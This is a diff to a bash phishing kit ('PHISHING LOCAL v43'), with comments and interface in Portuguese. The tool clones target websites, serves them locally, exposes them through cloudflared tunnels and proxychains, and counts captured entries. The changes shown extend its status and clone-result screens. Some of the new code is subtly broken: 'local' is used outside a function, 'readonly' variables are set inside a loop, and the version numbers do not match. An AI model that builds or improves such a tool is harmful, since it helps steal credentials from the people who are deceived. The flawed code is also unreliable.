@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v42 - Clonador Profissional
+# 🎣 PHISHING LOCAL v43 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
@@ -680,7 +680,7 @@ show_tunnel_link() {
 show_status() {
     clear
     echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
-    echo -e "${CYAN}         STATUS${NC}"
+    echo -e "${CYAN}         STATUS DO SISTEMA${NC}"
     echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
     echo ""
 
@@ -688,25 +688,38 @@ show_status() {
     echo -n "  Curl:    "; command -v curl &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${RED}NO${NC}"
     echo -n "  Proxy:   "; command -v proxychains4 &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${YELLOW}NO${NC}"
     echo -n "  Cloud:   "; command -v cloudflared &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${YELLOW}NO${NC}"
+    echo -n "  Ver:     ${WHITE}v42${NC}"
     echo ""
 
+    # Processos
+    echo ""
+    echo -e "  ${PURPLE}Processos:${NC}"
+    echo -n "  Servidor: "; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && echo -e "${GREEN}ON (PID $(cat $SCRIPT_DIR/.server.pid))${NC}" || echo -e "${RED}OFF${NC}"
+    echo -n "  Tunel:    "; [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.tunnel.pid)" 2>/dev/null && echo -e "${GREEN}ON${NC}" || echo -e "${RED}OFF${NC}"
+
+    # Clone atual
     if [ -d "$SITE_DIR" ] && [ -f "$SITE_DIR/index.html" ]; then
         local sz=$(wc -c < "$SITE_DIR/index.html" 2>/dev/null | tr -d ' ')
-        local css=$(ls "$SITE_DIR"/css_*.css 2>/dev/null | wc -l)
-        local js=$(ls "$SITE_DIR"/js_*.js 2>/dev/null | wc -l)
-        local assets=$(ls "$SITE_DIR"/asset_* 2>/dev/null | wc -l)
+        local css=$(find "$SITE_DIR" -name "css_*" -type f 2>/dev/null | wc -l)
+        local js=$(find "$SITE_DIR" -name "js_*" -type f 2>/dev/null | wc -l)
+        local assets=$(find "$SITE_DIR" -name "asset_*" -type f 2>/dev/null | wc -l)
+        local total_sz=$(du -sh "$SITE_DIR" 2>/dev/null | cut -f1)
+        local tot_files=$(find "$SITE_DIR" -type f 2>/dev/null | wc -l)
 
-        echo -e "  ${PURPLE}Site:${NC}"
-        echo -e "  HTML:    ${sz} bytes"
-        echo -e "  CSS:     ${css}"
-        echo -e "  JS:      ${js}"
-        echo -e "  Assets:  ${assets}"
+        echo ""
+        echo -e "  ${PURPLE}Clone atual:${NC}"
+        echo -e "  URL:     ${WHITE}$(cat "$SCRIPT_DIR/.last_url" 2>/dev/null | cut -d'|' -f1 || echo '?')${NC}"
+        echo -e "  Total:   ${GREEN}${total_sz}${NC} (${tot_files} arquivos)"
+        echo -e "  HTML:    ${WHITE}${sz} bytes${NC}"
+        echo -e "  CSS:     ${css} | JS: ${js} | Assets: ${assets}"
 
         local is_spa=$(grep -qiE '<app-root|_nghost|__NEXT_DATA__|data-reactroot|ng-version|vue-router' "$SITE_DIR/index.html" 2>/dev/null && echo 1 || echo 0)
         local ext=$(grep -oE '(src|href)="https?://[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | grep -v 'localhost\|127\.0\.0\.1' | wc -l | tr -d ' ')
+        local title=$(grep -oE '<title>[^<]+</title>' "$SITE_DIR/index.html" 2>/dev/null | sed 's/<[^>]*>//g' | head -1)
+        [ -n "$title" ] && echo -e "  Titulo:   ${WHITE}${title}${NC}"
 
         if [ "$is_spa" = "1" ]; then
-            echo -e "  Tipo:    ${RED}SPA (fake page)${NC}"
+            echo -e "  Tipo:    ${RED}SPA (conteudo via JS)${NC}"
         elif [ "$css" -eq 0 ]; then
             echo -e "  Tipo:    ${YELLOW}sem CSS${NC}"
         elif [ "$js" -eq 0 ]; then
@@ -714,21 +727,50 @@ show_status() {
         else
             echo -e "  Tipo:    ${GREEN}completo${NC}"
         fi
-        [ "$ext" -gt 0 ] && echo -e "  ${RED}Links ext: ${ext}${NC}"
+        [ "$ext" -gt 0 ] && echo -e "  ${YELLOW}Links externos restantes: ${ext}${NC}"
+
+        # Erros do curl
+        local curl_err=0; [ -f "$SCRIPT_DIR/curl.log" ] && curl_err=$(grep -ci "could not\|error\|timeout\|failed" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
+        if [ "$curl_err" -gt 0 ]; then
+            echo ""
+            echo -e "  ${RED}Ultimos erros curl:${NC}"
+            grep -i "could not\|error\|timeout\|failed" "$SCRIPT_DIR/curl.log" 2>/dev/null | tail -3 | while read l; do echo -e "    ${RED}${l}${NC}"; done
+        fi
+
+        # Server.log
+        if [ -f "$SCRIPT_DIR/server.log" ]; then
+            local srv_err=$(grep -ci "error" "$SCRIPT_DIR/server.log" 2>/dev/null || echo 0)
+            if [ "$srv_err" -gt 0 ]; then
+                echo ""
+                echo -e "  ${RED}Ultimo erro do servidor:${NC}"
+                grep -i "error" "$SCRIPT_DIR/server.log" 2>/dev/null | tail -2 | while read l; do echo -e "    ${RED}${l}${NC}"; done
+            fi
+        fi
     else
-        echo -e "  Sem clone atual"
+        echo ""
+        echo -e "  ${RED}Sem clone atual${NC}"
     fi
 
-    echo ""
-    echo -e "  ${PURPLE}Processos:${NC}"
-    echo -n "  Servidor: "; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && echo -e "${GREEN}ON${NC}" || echo -e "${RED}OFF${NC}"
-    echo -n "  Tunel:    "; [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.tunnel.pid)" 2>/dev/null && echo -e "${GREEN}ON${NC}" || echo -e "${RED}OFF${NC}"
-
+    # Capturas
     local caps=0; [ -f "$LOG_FILE" ] && caps=$(wc -l < "$LOG_FILE" 2>/dev/null | tr -d ' ')
     echo ""
     echo -e "  Capturas: ${GREEN}${caps}${NC}"
+
+    # Ultimo clone do historico
+    if [ -f "$SCRIPT_DIR/.history" ]; then
+        echo ""
+        echo -e "  ${PURPLE}Ultimos clones:${NC}"
+        tail -3 "$SCRIPT_DIR/.history" 2>/dev/null | while IFS='|' read -r u r p t d; do
+            echo -e "    ${WHITE}${u}${NC} (${p}) - ${t}"
+        done
+    fi
+
+    # Espaco em disco
+    local disk_avail=$(df -h "$SCRIPT_DIR" 2>/dev/null | tail -1 | awk '{print $4}' || echo "?")
     echo ""
-    echo -e "${YELLOW}Enter...${NC}"
+    echo -e "  Disco liv: ${WHITE}${disk_avail}${NC}"
+    echo ""
+    echo -e "${YELLOW}Press Enter...${NC}"
     read
 }
 
@@ -809,7 +851,7 @@ while true; do
     echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
     echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
     echo ""
-    echo -e "  🎣 PHISHING LOCAL ${CYAN}v42${NC}"
+    echo -e "  🎣 PHISHING LOCAL ${CYAN}v43${NC}"
     echo ""
     echo "  ─────────────────────────────────────────"
     echo ""
@@ -903,8 +945,50 @@ while true; do
             [ -z "$REDIR" ] && REDIR="$URL"
 
             # CLONAR
+            echo ""
+            echo -e "  ${WHITE}╔═══════════════════════════════════════╗${NC}"
+            echo -e "  ${WHITE}║        CLONANDO SITE...               ║${NC}"
+            echo -e "  ${WHITE}╚═══════════════════════════════════════╝${NC}"
+            echo ""
+
+            # Salvar hora do inicio
+            readonly CLONE_START=$(date +%s)
+
             clone_site "$URL" "$REDIR" "$PT" "$use_proxy"
+
+            readonly CLONE_END=$(date +%s)
+            readonly CLONE_ELAPSED=$((CLONE_END - CLONE_START))
+
+            # Resultado
+            echo ""
+            echo -e "  ${PURPLE}╔═══════════════════════════════════════╗${NC}"
+            echo -e "  ${PURPLE}║          RESULTADO DO CLONE          ║${NC}"
+            echo -e "  ${PURPLE}╚═══════════════════════════════════════╝${NC}"
+
+            local clone_sz=$(du -sh "$SITE_DIR" 2>/dev/null | cut -f1)
+            local html_sz=0; [ -f "$SITE_DIR/index.html" ] && html_sz=$(stat -c%s "$SITE_DIR/index.html" 2>/dev/null || echo 0)
+            local css_c=$(find "$SITE_DIR" -name "css_*" -type f 2>/dev/null | wc -l)
+            local js_c=$(find "$SITE_DIR" -name "js_*" -type f 2>/dev/null | wc -l)
+            local as_c=$(find "$SITE_DIR" -name "asset_*" -type f 2>/dev/null | wc -l)
+            local srv_state="OFF"; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && srv_state="ON"
+
+            echo -e "  Tempo:    ${WHITE}${CLONE_ELAPSED}s${NC}"
+            [ -n "$clone_sz" ] && echo -e "  Total:    ${GREEN}${clone_sz}${NC}"
+            [ "$html_sz" -gt 0 ] && echo -e "  HTML:     ${GREEN}${html_sz} bytes${NC}"
+            [ "$css_c" -gt 0 ] && echo -e "  CSS:      ${GREEN}${css_c} arquivos${NC}"
+            [ "$js_c" -gt 0 ] && echo -e "  JS:       ${GREEN}${js_c} arquivos${NC}"
+            [ "$as_c" -gt 0 ] && echo -e "  Assets:   ${GREEN}${as_c} arquivos${NC}"
+            echo -e "  Servidor: ${srv_state}"
+
+            local curl_err=$(grep -ci "error\|curl" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
+            [ "$curl_err" -gt 0 ] && echo -e "  ${YELLOW}Erros curl: ${curl_err}${NC}"
+
+            echo ""
+            echo -e "${YELLOW}Press Enter...${NC}"
+            read
             ;;
+
+
         2) view_capturas ;;
         3) start_tunnel ;;
         4) show_history ;;
